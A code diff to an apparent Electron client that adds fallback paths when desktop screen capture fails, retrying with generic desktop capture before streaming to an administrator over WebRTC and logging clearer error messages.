@@ -67,15 +67,23 @@ window.onload = async () => {
                     });
                 } catch (audioErr) {
                     console.log("Desktop audio capture failed (no speakers?). Trying video only...", audioErr);
-                    localScreenStream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
-                    });
+                    try {
+                        localScreenStream = await navigator.mediaDevices.getUserMedia({
+                            audio: false,
+                            video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
+                        });
+                    } catch (videoErr) {
+                        console.log("Specific screen capture failed. Falling back to generic desktop capture...", videoErr);
+                        localScreenStream = await navigator.mediaDevices.getUserMedia({
+                            audio: false,
+                            video: { mandatory: { chromeMediaSource: 'desktop' } }
+                        });
+                    }
                 }
 
                 setupWebRTC(adminId, localScreenStream);
             } catch (e) {
-                console.error("Screen Capture failed", e);
+                console.error("Screen Capture failed completely:", e);
                 socket.emit('client-error', "Screen Capture failed: " + e.message);
             }
         });
@@ -98,10 +106,18 @@ window.onload = async () => {
                     });
                 } catch (audioErr) {
                     console.log("Desktop audio capture failed, using video only", audioErr);
-                    screenStream = await navigator.mediaDevices.getUserMedia({
-                        audio: false,
-                        video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
-                    });
+                    try {
+                        screenStream = await navigator.mediaDevices.getUserMedia({
+                            audio: false,
+                            video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: mainScreen.id } }
+                        });
+                    } catch (videoErr) {
+                        console.log("Specific screen capture failed. Falling back to generic desktop capture...", videoErr);
+                        screenStream = await navigator.mediaDevices.getUserMedia({
+                            audio: false,
+                            video: { mandatory: { chromeMediaSource: 'desktop' } }
+                        });
+                    }
                 }
 
                 try {
